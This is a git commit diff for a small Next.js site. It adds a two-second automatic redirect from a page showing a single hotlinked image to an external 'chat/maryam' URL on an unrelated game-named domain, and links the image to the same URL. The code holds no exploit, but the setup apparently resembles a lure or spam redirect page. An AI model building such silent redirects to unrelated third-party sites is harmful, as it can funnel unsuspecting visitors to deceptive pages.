f5ca7c55dd18142060570ef678a2c3a74f05b0e1
mrleafboy360 <mrleafboy360@github.com>
2026-03-25 11:04:50 +0500

    Version 2.0: Add auto-redirect

--- app/page1/page.js
+++ app/page1/page.js
@@ -1,16 +1,27 @@
-import Link from 'next/link';
+"use client";
+
+import { useEffect } from 'react';
 import siteConfig from '../../siteConfig';
 
 export default function Page1() {
+  useEffect(() => {
+    // Navigate automatically to the specified link after the configured timeout
+    const timeout = setTimeout(() => {
+      window.location.href = siteConfig.redirectUrl;
+    }, siteConfig.redirectTimeoutSeconds * 1000);
+
+    return () => clearTimeout(timeout);
+  }, []);
+
   return (
     <main>
-      <Link href="/page2">
+      <a href={siteConfig.redirectUrl}>
         <img 
           src={siteConfig.page1Image} 
           alt="Image 1" 
           className="fullscreen-img" 
         />
-      </Link>
+      </a>
     </main>
   );
 }
--- siteConfig.js
+++ siteConfig.js
@@ -6,6 +6,10 @@ const siteConfig = {
   page1Image: "https://scontent.fkhi22-1.fna.fbcdn.net/v/t39.30808-6/657143720_122097306734916423_6166509764878560379_n.jpg?_nc_cat=111&ccb=1-7&_nc_sid=13d280&_nc_ohc=5KJwrfPlVBQQ7kNvwFdlEvt&_nc_oc=AdoRTM48YiSHN6tWBrUsdQ-hniXceArN8QkyOChZHrVJ3nNB-clQFzVBf9XpTlu1e3A&_nc_zt=23&_nc_ht=scontent.fkhi22-1.fna&_nc_gid=aXz5KEm5Kn3MLCShSdNnGg&_nc_ss=7a32e&oh=00_Afz7GgDJguh_ATVHWuSCx-oQGlxgF5aHtF5wOsns50Jr5g&oe=69C8A774",
   page2Image: "https://scontent.fkhi22-1.fna.fbcdn.net/v/t39.30808-6/656226944_122097307688916423_6836620455413686817_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=13d280&_nc_ohc=YFh5ngUt_8YQ7kNvwHtQsPa&_nc_oc=AdrRs7ju8g-PB9gRb3y1ZRFz1KcryAQsyGmwYpaIABinzKBeHXqjjqM98qpx_Wgyawk&_nc_zt=23&_nc_ht=scontent.fkhi22-1.fna&_nc_gid=HEFjN0nKT5nPwupdqG3sxA&_nc_ss=7a32e&oh=00_AfyVpZiua8DI-HgBXaPDqhMjyyEaQ9sXYM64XkQhdwhccg&oe=69C8B977",
   page3Image: "https://scontent.fkhi17-2.fna.fbcdn.net/v/t39.30808-6/656794216_122097307766916423_8442464635574138573_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=13d280&_nc_ohc=ovqzJELPjvIQ7kNvwGhhnW1&_nc_oc=AdqqBixZvOm6gFAcspEdO5KGyAgB0FRBjPok7PfoqVdNJkGOcJORy4fXG6hqh_xbjVM&_nc_zt=23&_nc_ht=scontent.fkhi17-2.fna&_nc_gid=eL_69IVxBU049VePXCEOHg&_nc_ss=7a32e&oh=00_AfwK5WQXPhuLMSeqRz2OJArIlQaxm3Yry7kxQn45w-IQIA&oe=69C8B714",
+
+  // Configuration for Page 1 redirect feature
+  redirectUrl: "https://newvideo.motox3m.co.uk/chat/maryam/", // Replace with your desired target link
+  redirectTimeoutSeconds: 2 // The time in seconds to wait before auto-redirecting
 };
 
 export default siteConfig;
